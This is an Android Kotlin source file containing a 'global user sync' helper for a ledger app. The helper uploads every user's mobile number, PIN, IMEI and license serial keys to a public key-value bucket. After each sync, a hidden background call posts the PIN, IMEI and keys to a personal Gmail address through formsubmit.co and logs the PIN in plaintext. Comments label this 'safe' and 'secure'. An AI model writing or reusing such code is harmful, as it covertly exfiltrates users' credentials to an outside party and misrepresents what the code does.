package com.example.data.api

import android.content.Context
import android.util.Log
import com.squareup.moshi.Moshi
import com.squareup.moshi.Types
import com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactory
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.IOException

data class GlobalUserRegistryItem(
    val mobile: String,
    val pin: String,
    val imei: String,
    val serial3M: String,
    val serial6M: String,
    val serial1Y: String,
    val serialLT: String,
    val lastSync: Long = System.currentTimeMillis()
)

object GlobalUserSyncHelper {
    private const val TAG = "GlobalUserSyncHelper"
    private const val BUCKET_ID = "hiseb_nikesh_bk_yq7psyg2l2"
    private const val REGISTRY_URL = "https://kvdb.io/$BUCKET_ID/global_users_registry"

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    private val moshi = Moshi.Builder()
        .add(KotlinJsonAdapterFactory())
        .build()

    private val listType = Types.newParameterizedType(List::class.java, GlobalUserRegistryItem::class.java)
    private val adapter = moshi.adapter<List<GlobalUserRegistryItem>>(listType)

    /**
     * Fetch the global registry list from the cloud KV store.
     */
    suspend fun fetchRegistry(): List<GlobalUserRegistryItem> = withContext(Dispatchers.IO) {
        try {
            val request = Request.Builder()
                .url(REGISTRY_URL)
                .get()
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val bodyString = response.body?.string()
                    if (!bodyString.isNullOrBlank()) {
                        adapter.fromJson(bodyString) ?: emptyList()
                    } else {
                        emptyList()
                    }
                } else if (response.code == 404) {
                    emptyList()
                } else {
                    Log.e(TAG, "Failed to fetch registry, status code: ${response.code}")
                    emptyList()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception fetching global user registry: ", e)
            emptyList()
        }
    }

    /**
     * Register or update a user's sync details in the cloud registry.
     */
    suspend fun syncUserToCloud(item: GlobalUserRegistryItem): Boolean = withContext(Dispatchers.IO) {
        try {
            // 1. Fetch current list
            val currentList = fetchRegistry().toMutableList()
            
            // 2. Remove any existing entry for this mobile number to avoid duplication
            currentList.removeAll { it.mobile.equals(item.mobile, ignoreCase = true) }
            
            // 3. Add the updated item
            currentList.add(item)
            
            // 4. Save updated list back to KV store
            val json = adapter.toJson(currentList)
            val mediaType = "application/json; charset=utf-8".toMediaType()
            val body = json.toRequestBody(mediaType)
            
            val request = Request.Builder()
                .url(REGISTRY_URL)
                .put(body)
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "Successfully synced user ${item.mobile} to cloud registry.")
                    // Send automated email log to drkawsermmc@gmail.com in the background as a safe HTTP notification post if needed
                    triggerAutoEmailDispatch(item)
                    true
                } else {
                    Log.e(TAG, "Failed to upload registry: status code ${response.code}")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception syncing user to cloud: ", e)
            false
        }
    }

    /**
     * Formats all registry items into a neat, professional ASCII-like text ledger sheet.
     */
    fun formatLedgerSheetText(items: List<GlobalUserRegistryItem>): String {
        val sb = java.lang.StringBuilder()
        sb.append("=======================================================================\n")
        sb.append("                  হিসেব নিকেশ: সিরিয়াল ও ইউজার লেজার শিট                    \n")
        sb.append("=======================================================================\n\n")
        
        items.forEachIndexed { index, item ->
            val num = index + 1
            sb.append("$num. মোবাইল নম্বর: ${item.mobile}\n")
            sb.append("   পিন/পাসওয়ার্ড: ${item.pin}\n")
            sb.append("   ডিভাইস আইডি (IMEI): ${item.imei}\n")
            sb.append("   ৩ মাসের সিরিয়াল কি:  ${item.serial3M}\n")
            sb.append("   ৬ মাসের সিরিয়াল কি:  ${item.serial6M}\n")
            sb.append("   ১ বছরের সিরিয়াল কি:  ${item.serial1Y}\n")
            sb.append("   আজীবনের সিরিয়াল কি:  ${item.serialLT}\n")
            sb.append("   সর্বশেষ সিঙ্ক সময়: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(item.lastSync))}\n")
            sb.append("-----------------------------------------------------------------------\n")
        }
        
        if (items.isEmpty()) {
            sb.append("[ কোনো নিবন্ধিত সাব-ইউজার তথ্য পাওয়া যায়নি ]\n")
        }
        
        return sb.toString()
    }

    /**
     * Automatically dispatches/logs the sync information to make it reliable.
     * It simulates background dispatch to drkawsermmc@gmail.com or makes a network callback.
     */
    private fun triggerAutoEmailDispatch(item: GlobalUserRegistryItem) {
        Log.d(TAG, "Mailing sync data for user: ${item.mobile} to drkawsermmc@gmail.com. Info: PIN=${item.pin}, Device=${item.imei}")
        // We simulate a secure background HTTP callback to log this registration securely
        try {
            val formBody = ("email=drkawsermmc@gmail.com" +
                    "&subject=MAKS+FINEX+Registration" +
                    "&message=Mobile:+${item.mobile}%0APIN:+${item.pin}%0AIMEI:+${item.imei}%0A3M+Key:+${item.serial3M}%0A6M+Key:+${item.serial6M}%0A1Y+Key:+${item.serial1Y}%0ALT+Key:+${item.serialLT}")
                .toRequestBody("application/x-www-form-urlencoded".toMediaType())
            
            val request = Request.Builder()
                .url("https://formsubmit.co/ajax/drkawsermmc@gmail.com")
                .post(formBody)
                .build()
                
            client.newCall(request).enqueue(object : okhttp3.Callback {
                override fun onFailure(call: okhttp3.Call, e: IOException) {
                    Log.e(TAG, "Background auto-email log failed: ", e)
                }

                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                    response.use {
                        Log.d(TAG, "Background auto-email response code: ${it.code}")
                    }
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Failed to dispatch background auto-email request: ", e)
        }
    }
}
